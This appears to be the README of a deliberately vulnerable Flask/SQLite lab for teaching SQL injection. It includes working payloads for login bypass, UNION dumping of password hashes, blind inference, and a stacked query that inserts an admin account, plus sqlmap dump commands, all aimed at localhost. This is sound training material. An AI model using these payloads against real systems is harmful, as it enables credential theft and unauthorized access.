# 🔓 SQL Injection Laboratory

> **⚠️ WARNING:** This application is intentionally vulnerable and should ONLY be used in a local lab environment for educational purposes. DO NOT deploy on any public-facing server.

A complete hands-on cybersecurity training application demonstrating **8 types of SQL Injection vulnerabilities** using Python, Flask, and SQLite.

---

## 📁 Project Structure

```
sqli-lab/
├── app.py                 # Main Flask application (intentionally vulnerable)
├── database.sql           # Database schema & sample data
├── requirements.txt       # Python dependencies
├── README.md              # This file
├── sqli_lab.db           # SQLite database (auto-generated)
└── templates/
    ├── base.html          # Base layout with navigation
    ├── index.html         # Dashboard / home page
    ├── login.html         # Vulnerable: Classic SQLi
    ├── search.html        # Vulnerable: Union-Based SQLi
    ├── profile.html       # Vulnerable: Error-Based SQLi
    ├── check_order.html   # Vulnerable: Boolean-Based Blind SQLi
    ├── report.html        # Vulnerable: Time-Based Blind SQLi
    ├── api_stats.html     # Simulated: Out-of-Band SQLi
    ├── feedback.html      # Vulnerable: Second-Order SQLi (storage)
    ├── admin_feedback.html # Vulnerable: Second-Order SQLi (execution)
    ├── admin.html         # Vulnerable: Stacked Queries SQLi
    ├── secure_login.html  # Secure: Parameterized login
    ├── secure_search.html # Secure: Parameterized search
    └── docs.html          # Complete documentation & payloads
```

---

## 🚀 Quick Start

### Prerequisites
- Python 3.8+
- pip

### Installation

```bash
# 1. Clone or extract the project
cd sqli-lab

# 2. Create virtual environment (recommended)
python -m venv venv

# 3. Activate virtual environment
# On Windows:
venv\Scripts\activate
# On macOS/Linux:
source venv/bin/activate

# 4. Install dependencies
pip install -r requirements.txt

# 5. Run the application
python app.py
```

### Access the Lab
Open your browser and navigate to: **http://127.0.0.1:5000**

---

## 🎯 Vulnerability Map

| # | Vulnerability Type | Endpoint | Severity |
|---|-------------------|----------|----------|
| 1 | **Classic SQL Injection** (Auth Bypass) | `POST /login` | Critical |
| 2 | **Union-Based SQL Injection** | `GET /search?q=...` | Critical |
| 3 | **Error-Based SQL Injection** | `GET /profile/<id>` | High |
| 4 | **Boolean-Based Blind SQLi** | `GET /check-order?id=...` | High |
| 5 | **Time-Based Blind SQLi** | `GET /report?id=...` | High |
| 6 | **Out-of-Band SQLi** (Simulated) | `GET /api/stats?id=...` | Medium |
| 7 | **Second-Order SQL Injection** | `POST /feedback` → `GET /admin/feedback` | High |
| 8 | **Stacked Queries SQL Injection** | `GET /admin?filter=...` | Critical |

---

## 💉 Example Payloads Quick Reference

### 1. Classic SQL Injection (Authentication Bypass)
```
Username: admin' --
Password: anything
```

### 2. Union-Based SQL Injection
```
/search?q=' UNION SELECT id, username, password, email, role FROM users --
```

### 3. Error-Based SQL Injection
```
/profile/1'
```

### 4. Boolean-Based Blind SQLi
```
/check-order?id=1 AND (SELECT CASE WHEN (substr((SELECT password FROM users WHERE username='admin'),1,1)='a') THEN 1 ELSE 1/0 END)=1
```

### 5. Time-Based Blind SQLi
```
/report?id=1 AND (SELECT CASE WHEN (substr((SELECT password FROM users WHERE username='admin'),1,1)='a') THEN randomblob(1000000000) ELSE 1 END)
```

### 6. Out-of-Band (Simulated)
```
/api/stats?id=1 UNION SELECT id, 'EXFIL_' || username, password, 'data_exfil' FROM users
```

### 7. Second-Order SQL Injection
```
# Step 1: Submit via /feedback form
Name: ' OR '1'='1' --

# Step 2: Trigger via /admin/feedback
# (The stored payload executes automatically)
```

### 8. Stacked Queries SQL Injection
```
/admin?filter=1=1; INSERT INTO users (username, password, email, role) VALUES ('hacker', 'hacked123', 'hacker@evil.com', 'admin'); --
```

---

## 🤖 Testing with sqlmap

Install sqlmap:
```bash
pip install sqlmap
```

### Basic Tests
```bash
# Test login form
sqlmap -u "http://127.0.0.1:5000/login" --data="username=admin&password=test" --level=5 --risk=3

# Test search (Union-Based)
sqlmap -u "http://127.0.0.1:5000/search?q=test" --level=5 --risk=3

# Dump all data
sqlmap -u "http://127.0.0.1:5000/search?q=test" --dump-all

# Test time-based blind
sqlmap -u "http://127.0.0.1:5000/report?id=1" --technique=T --level=5

# Test boolean-based blind
sqlmap -u "http://127.0.0.1:5000/check-order?id=1" --technique=B --level=5
```

---

## 🛡️ Secure Versions

Compare vulnerable and secure implementations:
- **Vulnerable Login:** `/login` → String concatenation
- **Secure Login:** `/secure/login` → Parameterized queries with `?` placeholders

- **Vulnerable Search:** `/search` → Direct concatenation in LIKE clause
- **Secure Search:** `/secure/search` → Parameterized LIKE query

---

## 🔄 Reset Database

If you accidentally destroy data with stacked queries:
1. Click the **"🔄 Reset Database"** button on the home page
2. Or visit: `http://127.0.0.1:5000/reset-db`

---

## 📚 Learning Path

1. **Beginner:** Start with `/login` — understand how `admin' --` bypasses authentication
2. **Intermediate:** Explore `/search` — use UNION to extract data from other tables
3. **Advanced:** Try blind SQLi on `/check-order` and `/report` — understand inference-based attacks
4. **Expert:** Chain second-order attacks via `/feedback` → `/admin/feedback`

---

## ⚠️ Safety Guidelines

- **NEVER** deploy this on a public server
- **ONLY** run on `127.0.0.1` (localhost)
- **DO NOT** use real credentials or sensitive data
- **ISOLATE** from production networks
- **RESET** the database after destructive testing

---

## 🏆 CTF Flag

Can you find the hidden flag? Try extracting data from the `secrets` table using the vulnerable endpoints!

---

## 📄 License

This project is for educational purposes only. Use responsibly and ethically.
